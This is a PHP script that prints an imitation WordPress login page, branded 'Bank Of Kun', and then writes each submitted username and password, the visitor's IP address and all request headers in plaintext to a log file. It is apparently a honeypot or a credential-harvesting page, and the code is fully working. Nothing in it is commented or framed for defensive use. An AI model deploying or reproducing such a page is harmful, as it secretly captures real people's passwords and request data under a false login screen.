<?php

$log_file = '/path/to/log/wp-login.log';
$site_name = "yoursitename.here";


echo "<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en-US\"> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> <title>Bank Of Kun &rsaquo; Log In</title> <link rel='stylesheet' id='open-sans-css'  href='//fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=3.8.3' type='text/css' media='all' /> <link rel='stylesheet' id='dashicons-css'  href='http://$site_name/wp-includes/css/dashicons.min.css?ver=3.8.3' type='text/css' media='all' /> <link rel='stylesheet' id='wp-admin-css'  href='http://$site_name/wp-admin/css/wp-admin.min.css?ver=3.8.3' type='text/css' media='all' /> <link rel='stylesheet' id='buttons-css'  href='http://$site_name/wp-includes/css/buttons.min.css?ver=3.8.3' type='text/css' media='all' /> <link rel='stylesheet' id='colors-fresh-css'  href='http://$site_name/wp-admin/css/colors.min.css?ver=3.8.3' type='text/css' media='all' /> <script type='text/javascript' src='http://$site_name/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script> <script type='text/javascript' src='http://$site_name/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script> <meta name='robots' content='noindex,follow' /> </head> <body class=\"login login-action-login wp-core-ui\"> <div id=\"login\"> <h1><a href=\"http://wordpress.org/\" title=\"Powered by WordPress\">Bank Of Kun</a></h1> <form name=\"loginform\" id=\"loginform\" action=\"http://$site_name/wp-login.php\" method=\"post\"> <p> <label for=\"user_login\">Username<br /> <input type=\"text\" name=\"log\" id=\"user_login\" class=\"input\" value=\"\" size=\"20\" /></label> </p> <p> <label for=\"user_pass\">Password<br /> <input type=\"password\" name=\"pwd\" id=\"user_pass\" class=\"input\" value=\"\" size=\"20\" /></label> </p> <p class=\"forgetmenot\"><label for=\"rememberme\"><input name=\"rememberme\" type=\"checkbox\" id=\"rememberme\" value=\"forever\"  /> Remember Me</label></p> <p class=\"submit\"> <input type=\"submit\" name=\"wp-submit\" id=\"wp-submit\" class=\"button button-primary button-large\" value=\"Log In\" /> <input type=\"hidden\" name=\"redirect_to\" value=\"http://$site_name/wp-admin/\" /> <input type=\"hidden\" name=\"testcookie\" value=\"1\" /> </p> </form> <p id=\"nav\"> <a href=\"http://$site_name/wp-login.php?action=lostpassword\" title=\"Password Lost and Found\">Lost your password?</a> </p> <script type=\"text/javascript\"> function wp_attempt_focus(){ setTimeout( function(){ try{ d = document.getElementById('user_login'); d.focus(); d.select(); } catch(e){} }, 200); } wp_attempt_focus(); if(typeof wpOnload=='function')wpOnload(); </script> <p id=\"backtoblog\"><a href=\"http://$site_name/\" title=\"Are you lost?\">&larr; Back to Bank Of Kun</a></p> </div> <link rel='stylesheet' id='ad-gallery-style-css'  href='http://$site_name/wp-content/plugins/wp-e-commerce-dynamic-gallery/assets/js/mygallery/jquery.ad-gallery.css?ver=3.8.3' type='text/css' media='all' /> <link rel='stylesheet' id='woocommerce_fancybox_styles-css'  href='http://$site_name/wp-content/plugins/wp-e-commerce-dynamic-gallery/assets/js/fancybox/fancybox.css?ver=3.8.3' type='text/css' media='all' /> <script type='text/javascript' src='http://$site_name/wp-content/plugins/wp-e-commerce-dynamic-gallery/assets/js/mygallery/jquery.ad-gallery.js?ver=3.8.3'></script> <script type='text/javascript' src='http://$site_name/wp-content/plugins/wp-e-commerce-dynamic-gallery/assets/js/fancybox/fancybox.min.js?ver=3.8.3'></script> <div class=\"clear\"></div> </body> </html>";

	
$ip       = $_SERVER['REMOTE_ADDR'];
$logdate  = date(DATE_RFC2822);
$login    = $_POST['log'];
$password = $_POST['pwd'];
$redirect = $_POST['redirect_to'];

$data     = "===================================[Event $logdate Notice for $ip]=======================================\n";
$data .= "Login:" . $login . "\n";
$wp_submit = $_POST['wp_submit'];
$data .= "Password:" . $password . "\n";
$data .= "Redirect:" . $redirect . "\n";
foreach (getallheaders() as $name => $value) {
    $data .= "$name: $value\n";
}
$data .= "===========================================[Event End]============================================\n";
file_put_contents($log_file, $data, FILE_APPEND | LOCK_EX);
?>
